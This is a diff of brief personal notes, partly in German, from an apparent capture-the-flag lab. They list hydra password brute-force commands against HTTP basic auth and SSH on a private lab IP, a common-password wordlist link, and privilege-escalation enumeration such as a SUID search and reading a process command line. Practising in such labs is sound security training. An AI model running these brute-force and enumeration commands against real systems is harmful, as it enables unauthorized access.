@@ -17,6 +17,7 @@ mit allen ports
 ![[Pasted image 20250117180747.png]]
 ![[Pasted image 20250117180729.png]]
 ![[Pasted image 20250117181656.png]]
+python file für proof zeigen
 github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
 https://tylerrockwell.github.io/defeating-basic-auth-with-hydra/
 `hydra -l user -P pw.txt -s 55487 -f 192.168.15.3 http-get /`
@@ -34,5 +35,8 @@ https://tylerrockwell.github.io/defeating-basic-auth-with-hydra/
 `hydra -l GrumpyCat -P pw.txt 192.168.15.3 ssh -t 4`
 `find -perm -4000 2> /dev/null`
 ![[Pasted image 20250117195129.png]]
+`cat /proc/741/cmdline`
+`find -name "ctf_server.py" 2> /dev/null`
+![[Pasted image 20250117202527.png]]
 https://medium.com/techiepedia/series-of-ctf-machines-walkthrough-4-linux-privilege-escalation-enumeration-247899027be
 
